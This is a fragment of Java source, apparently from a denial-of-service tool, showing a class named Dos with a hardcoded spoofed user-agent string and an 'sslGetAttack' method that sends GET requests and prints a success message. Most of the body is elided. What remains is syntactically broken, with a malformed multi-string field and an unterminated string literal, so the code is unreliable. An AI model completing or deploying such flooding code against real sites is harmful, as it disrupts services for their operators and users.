...
public class Dos implements Runnable {
    ...
    private final String USER_AGENT =   "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","facebookscraper/1.0( http://www.facebook.com/sharescraper_help.php)",
    ...
    private void sslGetAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("GET attack done!
    }
}